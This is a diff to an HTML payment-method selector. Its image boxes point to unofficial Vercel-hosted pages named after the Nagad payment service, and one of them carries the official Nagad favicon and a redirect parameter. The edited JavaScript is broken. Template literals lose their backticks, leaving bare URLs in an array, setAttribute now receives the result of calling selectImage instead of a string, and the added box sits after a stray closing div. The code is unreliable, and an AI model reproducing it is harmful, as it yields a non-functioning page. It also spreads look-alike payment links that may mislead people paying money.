@@ -223,12 +223,18 @@
         <div class="subtitle">Choose Payment Method:</div>
 
         <div class="image-container">
-            <div class="image-box" onclick="selectImage(this, 'https://nagad-autopay.vercel.app/num.html?amount=1000')">
-                <img src="https://i.postimg.cc/Xv72SFtZ/Screenshot-2024-11-12-202636.jpg" alt="Image 1">
+            <div class="image-box" onclick="selectImage(this, 'https://nagad-autopay.vercel.app/num.html?amount=${amount}')">
+                <img src="https://i.postimg.cc/kX9SNLs7/IMG-3409.png
+" alt="Image 1">
                 <div class="checkbox">✔️</div>
             </div>
-            <div class="image-box" onclick="selectImage(this, 'https://securepayment-one.vercel.app/?amount=1000')">
-                <img src="https://i.postimg.cc/5yCJBD3M/Screenshot-2024-11-12-212550.jpg" alt="Image 2">
+            <div class="image-box" onclick="selectImage(this, 'https://securepayment-one.vercel.app/?amount=${amount}')">
+                <img src="https://i.postimg.cc/vZ05ZXWb/IMG-3406.png" alt="Image 2">
+                <div class="checkbox">✔️</div>
+            </div>
+        </div>
+            <div class="image-box" onclick="selectImage(this, 'https://nagad-manual.vercel.app/?amount=${amount}&redirect=https://no-emotion.vercel.app/contact-details.html')">
+                <img src="https://payment.mynagad.com:30000/img/nagad_favicon.png" alt="Image 3">
                 <div class="checkbox">✔️</div>
             </div>
         </div>
@@ -293,11 +299,11 @@
     // Update the image container links dynamically
     document.querySelectorAll('.image-box').forEach((box, index) => {
         const links = [
-            `https://nagad-autopay.vercel.app/num.html?amount=${amount}`,
-            `https://securepayment-one.vercel.app/?amount=${amount}`
+            https://nagad-autopay.vercel.app/num.html?amount=${amount},
+            https://securepayment-one.vercel.app/?amount=${amount}
         ];
         // Assign the respective link based on the image index
-        box.setAttribute('onclick', `selectImage(this, '${links[index]}')`);
+        box.setAttribute('onclick', selectImage(this, '${links[index]}'));
     });
 </script>
 
